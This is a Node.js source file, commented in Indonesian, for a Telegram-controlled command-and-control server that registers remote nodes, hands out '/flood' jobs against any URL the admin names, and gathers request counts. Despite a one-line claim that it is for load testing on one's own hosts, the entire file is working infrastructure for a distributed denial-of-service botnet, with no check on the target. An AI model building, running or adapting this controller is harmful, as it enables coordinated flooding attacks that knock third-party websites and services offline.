// language: JavaScript (Node 18+), file: c2_bot.js
// deps: npm install node-telegram-bot-api express
// *C2 buat load-test terdistribusi — node harus host yang lo kontrol sendiri*

const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const crypto = require('crypto');

// ==== CONFIG ====
const BOT_TOKEN = 'ISI_TOKEN';
const ADMIN_ID = 123456789;      // telegram id lo
const API_PORT = 8080;
// =================

const bot = new TelegramBot(BOT_TOKEN, { polling: true });
const app = express();
app.use(express.json());

const NODES = {};    // node_id -> { last_seen, hostname, ip }
const JOBS = {};     // job_id -> { url, duration, concurrency, started, nodes, reports }
const PENDING = {};  // node_id -> job command

const auth = (msg) => msg.from.id === ADMIN_ID;
const genId = () => crypto.randomBytes(4).toString('hex');

// ==== HTTP API buat node ====
app.post('/register', (req, res) => {
    const { node_id, hostname } = req.body;
    NODES[node_id] = {
        last_seen: Date.now(),
        hostname: hostname || '?',
        ip: req.ip
    };
    res.json({ ok: true });
});

app.get('/poll', (req, res) => {
    const nid = req.query.node_id;
    if (NODES[nid]) NODES[nid].last_seen = Date.now();
    const job = PENDING[nid] || null;
    delete PENDING[nid];
    res.json({ job });
});

app.post('/report', (req, res) => {
    const { node_id, job_id, stats } = req.body;
    if (JOBS[job_id]) JOBS[job_id].reports[node_id] = stats;
    res.json({ ok: true });
});

app.listen(API_PORT, () => console.log(`C2 API up on :${API_PORT}`));

// ==== Telegram commands ====
bot.onText(/\/start/, (msg) => {
    if (!auth(msg)) return;
    bot.sendMessage(msg.chat.id,
        '/nodes — list node online\n' +
        '/flood <url> <detik> <conn/node> — start job\n' +
        '/status <job_id> — cek job\n' +
        '/stop <job_id> — stop job'
    );
});

bot.onText(/\/nodes/, (msg) => {
    if (!auth(msg)) return;
    const now = Date.now();
    const online = Object.entries(NODES).filter(([, v]) => now - v.last_seen < 60000);
    if (!online.length) return bot.sendMessage(msg.chat.id, 'ga ada node online');
    const lines = online.map(([k, v]) =>
        `${k} | ${v.hostname} | ${v.ip} | ${Math.floor((now - v.last_seen) / 1000)}s ago`
    );
    bot.sendMessage(msg.chat.id, `${online.length} node online:\n${lines.join('\n')}`);
});

bot.onText(/\/flood(?:\s+(.+))?/, (msg, match) => {
    if (!auth(msg)) return;
    const args = (match[1] || '').trim().split(/\s+/);
    if (!args[0]) return bot.sendMessage(msg.chat.id, '/flood <url> [detik] [conn/node]');

    const url = args[0];
    const duration = parseInt(args[1]) || 60;
    const conn = parseInt(args[2]) || 100;

    const now = Date.now();
    const online = Object.entries(NODES)
        .filter(([, v]) => now - v.last_seen < 60000)
        .map(([k]) => k);
    if (!online.length) return bot.sendMessage(msg.chat.id, 'ga ada node online');

    const job_id = genId();
    JOBS[job_id] = { url, duration, concurrency: conn, started: now, nodes: online, reports: {} };
    online.forEach(nid => {
        PENDING[nid] = { job_id, url, duration, concurrency: conn };
    });
    bot.sendMessage(msg.chat.id,
        `job ${job_id} — ${online.length} node, ${conn} conn/node, ${duration}s -> ${url}`
    );
});

bot.onText(/\/status(?:\s+(.+))?/, (msg, match) => {
    if (!auth(msg)) return;
    const jid = (match[1] || '').trim();
    if (!jid) return bot.sendMessage(msg.chat.id, '/status <job_id>');
    const job = JOBS[jid];
    if (!job) return bot.sendMessage(msg.chat.id, 'job ga ketemu');

    const reports = Object.values(job.reports);
    const total = reports.reduce((s, r) => s + (r.total || 0), 0);
    const ok = reports.reduce((s, r) => s + (r.ok || 0), 0);
    bot.sendMessage(msg.chat.id,
        `job ${jid}\nnode lapor: ${reports.length}/${job.nodes.length}\n` +
        `total req: ${total}\nok: ${ok}\nfail: ${total - ok}`
    );
});

bot.onText(/\/stop(?:\s+(.+))?/, (msg, match) => {
    if (!auth(msg)) return;
    const jid = (match[1] || '').trim();
    if (!jid || !JOBS[jid]) return;
    JOBS[jid].nodes.forEach(nid => {
        PENDING[nid] = { job_id: jid, stop: true };
    });
    bot.sendMessage(msg.chat.id, `stop signal dikirim ke job ${jid}`);
});

console.log('C2 bot up');
